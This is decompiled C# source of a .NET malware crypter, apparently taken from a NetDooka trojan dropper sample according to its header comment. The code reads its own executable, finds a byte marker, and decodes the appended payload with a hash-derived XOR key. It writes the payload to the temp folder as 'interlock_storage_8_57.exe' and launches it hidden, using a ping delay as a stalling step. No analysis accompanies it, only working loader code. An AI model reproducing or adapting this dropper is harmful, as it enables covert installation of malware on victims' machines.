// Decompiled with JetBrains decompiler
// Type: DotNetCrypter.EntryPoint
// Assembly: DotNetCrypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C758D580-6E9B-4B74-83EC-5C931860F746
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Dropper.MSIL.NetDooka.gen-43dcf8eea02b7286ba481ca84ec1b4d9299ba5db293177ff0a28231b36600a22.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;

namespace DotNetCrypter
{
  internal class EntryPoint
  {
    private static bool webFlag;
    private static List<uint> numList;
    private static byte[] sharedData;

    private static int SearchBytes(byte[] array, byte[] subarray)
    {
      int length = subarray.Length;
      int num = array.Length - length;
      for (int index1 = 0; index1 <= num; ++index1)
      {
        int index2 = 0;
        while (index2 < length && (int) subarray[index2] == (int) array[index1 + index2])
          ++index2;
        if (index2 == length)
          return index1;
      }
      return -1;
    }

    private static List<uint> NumberGen(uint n)
    {
      List<uint> uintList = new List<uint>();
      for (uint index = 2; index < n; ++index)
        uintList.Add(index);
      for (int index1 = 0; index1 < uintList.Count; ++index1)
      {
        for (uint index2 = 2; index2 < n; ++index2)
          uintList.Remove(uintList[index1] * index2);
      }
      return uintList;
    }

    private static void ProcessBytes(byte[] input)
    {
      SHA256 shA256 = SHA256.Create();
      List<uint> numList = EntryPoint.numList;
      byte num1 = 0;
      for (int index = 0; index < numList.Count<uint>(); ++index)
      {
        byte[] hash = shA256.ComputeHash(BitConverter.GetBytes(numList[index]));
        num1 += hash[0];
      }
      string str = Path.GetTempPath() + "\\interlock_storage_8_57.exe";
      byte[] numArray = new byte[input.Length];
      for (int index = 0; index < input.Length; ++index)
      {
        byte num2 = (byte) ((uint) (byte) ((uint) input[index] ^ (uint) num1) - (uint) (index % 256));
        numArray[index] = num2;
      }
      EntryPoint.sharedData = numArray;
    }

    public static void Main()
    {
      Thread thread = new Thread((ThreadStart) (() =>
      {
        while (EntryPoint.sharedData == null)
          Thread.Sleep(1000);
        string path = Path.GetTempPath() + "\\interlock_storage_8_57.exe";
        File.WriteAllBytes(path, EntryPoint.sharedData);
        new Process()
        {
          StartInfo = {
            UseShellExecute = false,
            FileName = path,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }));
      thread.Start();
      byte[] numArray1 = File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
      string[] strArray = new string[11]
      {
        "11",
        "42",
        "91",
        "50",
        "7F",
        "B4",
        "6C",
        "AA",
        "75",
        "5E",
        "8D"
      };
      byte[] subarray = new byte[strArray.Length];
      for (int index = 0; index < strArray.Length; ++index)
        subarray[index] = (byte) uint.Parse(strArray[index], NumberStyles.HexNumber);
      Process process = new Process();
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.FileName = "ping.exe";
      process.StartInfo.Arguments = "5.4.3.1";
      process.StartInfo.CreateNoWindow = true;
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.Start();
      process.WaitForExit();
      EntryPoint.numList = EntryPoint.NumberGen(8192U);
      int num1 = EntryPoint.SearchBytes(numArray1, subarray);
      if (num1 != -1)
      {
        int num2 = num1 + strArray.Length;
        int num3 = 0;
        byte[] numArray2 = new byte[numArray1.Length - num2 - num3];
        Array.Copy((Array) numArray1, num2 + num3, (Array) numArray2, 0, numArray2.Length);
        EntryPoint.ProcessBytes(numArray2);
      }
      thread.Join();
    }
  }
}
